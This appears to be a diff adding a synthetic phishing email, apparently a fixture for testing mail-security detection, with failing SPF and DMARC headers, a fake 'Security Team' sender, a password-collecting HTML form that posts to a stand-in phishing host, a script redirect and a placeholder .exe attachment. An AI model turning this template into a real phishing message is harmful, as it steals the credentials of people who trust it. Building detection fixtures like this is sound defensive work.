@@ -1,0 +1,46 @@
+Received: from mail.server.com (unknown [192.168.1.100])
+	by mx.google.com with ESMTPS id abc123def456
+	for <test@example.com>; Mon, 01 Jan 2024 12:00:00 +0000
+Received-SPF: fail (google.com: domain of sender@example.com does not designate 192.168.1.100 as permitted sender)
+Authentication-Results: mx.google.com;
+       spf=fail smtp.mailfrom=sender@example.com;
+       dkim=pass header.d=example.com;
+       dmarc=fail header.from=example.com
+From: "Security Team" <security@example.com>
+To: "Test User" <test@example.com>
+Subject: Urgent: Your Account Security Alert
+Date: Mon, 01 Jan 2024 12:00:00 +0000
+Message-ID: <123456789@example.com>
+Reply-To: "Support" <support@phishing-site.com>
+Content-Type: multipart/mixed; boundary="boundary123"
+
+--boundary123
+Content-Type: text/html; charset="utf-8"
+
+<html>
+<head>
+    <title>Security Alert</title>
+    <meta http-equiv="refresh" content="0;url=http://phishing-site.com/login">
+</head>
+<body>
+    <h1>Important Security Notice</h1>
+    <p>We detected suspicious activity on your account. Please verify your credentials immediately.</p>
+    <form action="http://phishing-site.com/collect" method="post">
+        <input type="hidden" name="token" value="abc123">
+        <label>Username: <input type="text" name="username"></label><br>
+        <label>Password: <input type="password" name="password"></label><br>
+        <input type="submit" value="Verify Account">
+    </form>
+    <p>Or click here: <a href="http://bit.ly/security-check">Secure Your Account</a></p>
+    <script>
+        document.location = "http://malicious-site.com/track";
+    </script>
+</body>
+</html>
+
+--boundary123
+Content-Type: application/octet-stream; name="document.exe"
+Content-Disposition: attachment; filename="document.exe"
+
+Fake executable content would be here in a real email.
+--boundary123--
